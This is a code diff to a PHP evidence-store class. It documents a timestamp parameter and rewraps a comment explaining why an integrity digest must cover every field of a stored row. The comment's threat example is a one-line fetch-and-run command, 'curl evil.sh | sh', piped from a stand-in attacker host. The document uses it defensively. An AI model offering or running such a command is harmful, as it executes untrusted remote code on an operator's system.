@@ -1161,6 +1161,10 @@ final class EvidenceStore {
    *   The attempt number.
    * @param \Droost\Workflow\Evidence\CheckRecord $check
    *   The verdict.
+   * @param string $adjudicatedAt
+   *   The timestamp this row is stored with, passed in rather than taken
+   *   again here: the digest has to cover the value the row actually
+   *   carries, and two calls to date('c') can straddle a second.
    *
    * @return string
    *   The digest.
@@ -1177,13 +1181,13 @@ final class EvidenceStore {
     // verdict fields and left `remedy`, `invocation`, `provider` and the
     // timestamps outside, which is worse than it sounds:
     //
-    //   * `remedy` is the command an operator is TOLD TO RUN to clear an
-    //     environment block. Rewriting it to `curl evil.sh | sh` was invisible.
-    //   * `invocation` is what the report prints as the command that ran, and
-    //     it prints it raw, outside the table, explicitly so it can be run.
-    //   * `provider` is a contributed check's attribution, stamped from the
-    //     plugin id precisely so a check cannot claim to be another module's,
-    //     and it could be rewritten to claim exactly that.
+    // `remedy` is the command an operator is TOLD TO RUN to clear an
+    // environment block, so rewriting it to `curl evil.sh | sh` was invisible.
+    // `invocation` is what the report prints as the command that ran, and it
+    // prints it raw, outside the table, explicitly so it can be run. And
+    // `provider` is a contributed check's attribution, stamped from the plugin
+    // id precisely so a check cannot claim to be another module's — which it
+    // could then be rewritten to claim.
     //
     // A digest over part of a row invites the question "which part", and the
     // answer should not be "the part I thought of first".
